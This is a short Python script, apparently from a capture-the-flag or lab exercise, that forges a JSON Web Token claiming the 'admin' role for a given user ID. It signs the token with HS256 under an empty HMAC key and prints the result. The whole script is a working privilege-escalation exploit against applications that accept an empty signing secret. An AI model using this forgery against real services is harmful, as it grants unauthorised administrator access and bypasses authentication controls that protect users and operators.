
import base64
import hmac
import hashlib

header = '{"alg":"HS256","typ":"JWT"}'
payload = '{"role":"admin","uid":"d6b8890fbd394560bf979deb5c05df77","username":"aaa"}'

header_b64 = base64.urlsafe_b64encode(header.encode()).rstrip(b'=')
payload_b64 = base64.urlsafe_b64encode(payload.encode()).rstrip(b'=')

signature = hmac.new(b'', b'.'.join([header_b64, payload_b64]), hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=')

final = b'.'.join([header_b64, payload_b64, sig_b64]).decode()
print(f"JWT with empty key: {final}")
